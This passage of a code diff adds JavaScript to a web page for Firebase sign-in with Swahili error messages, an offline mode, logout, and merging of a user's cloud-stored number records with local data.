+        "auth/wrong-password":"Password si sahihi.",
+        "auth/user-not-found":"Mtumiaji hajasajiliwa. Bonyeza SAJILI.",
+        "auth/email-already-in-use":"Email tayari imetumika — ingia.",
+        "auth/invalid-email":"Email si sahihi.",
+        "auth/weak-password":"Password fupi (≥6).",
+        "auth/network-request-failed":"Hakuna mtandao. Jaribu tena."
+      };
+      AE.textContent = "✖ " + (map[e.code] || e.message || "Hitilafu.");
+    }finally{ DO.disabled = false; }
+  };
+
+  P2.addEventListener("keydown", e=>{ if(e.key==="Enter") DO.click(); });
+
+  AN.onclick = () => {
+    hideAuth();
+    AS.textContent = "Offline mode — data ni ya kifaa tu.";
+  };
+
+  LO.onclick = async () => {
+    try{ if(window.__fb) await window.__fb.signOut(window.__fb.auth); }catch(e){}
+    showAuth("Umetoka. Ingia tena au ruka offline.");
+  };
+
+  async function cloudLoadDb(){
+    const f = window.__fb;
+    if(!f || !f.auth.currentUser) return;
+    try{
+      const uid = f.auth.currentUser.uid;
+      const col = f.collection(f.fdb, "users", uid, "numbers");
+      const snap = await f.getDocs(col);
+      let n=0;
+      snap.forEach(d=>{
+        const o=d.data();
+        if(o && o.num){
+          // merge: chukua cloud ikiwa na scans zaidi
+          const local = db[o.num];
+          if(!local || (o.scans||0) >= (local.scans||0)) db[o.num] = o;
+          n++;
+        }
+      });
+      store.set(K_D, db);
+      dbCount();
+      renderDb();
+      if(n) console.log("Cloud: namba", n, "zimepakiwa.");
+    }catch(e){ console.warn("cloud load fail", e); }
+  }
+
+  function initAuthListener(){
+    const f = window.__fb;
+    if(!f){ setTimeout(initAuthListener, 200); return; }
+    f.onAuthStateChanged(f.auth, async user => {
+      if(user){
+        hideAuth();
+        UB.hidden = false;
+        UB.classList.add("online");
+        UE.textContent = user.email || user.uid.slice(0,8);
+        AS.textContent = "Umeingia: " + (user.email || user.uid);
+        await cloudLoadDb();
+      }else{
+        UB.hidden = true;
+        UB.classList.remove("online");
+        AS.textContent = "Haujaingia — data itabaki kwenye kifaa.";
+      }
+    });
+  }
+  initAuthListener();
+
+  // kama SDK haijapaki kwa sekunde 5, onyesha ujumbe
+  setTimeout(()=>{
+    if(!window.__fb){
+      AE.textContent = "✖ Firebase haijapakiwa. Angalia mtandao kisha refresh.";
+    }
+  }, 5000);
+})();
 </script>
 </body>
 </html>
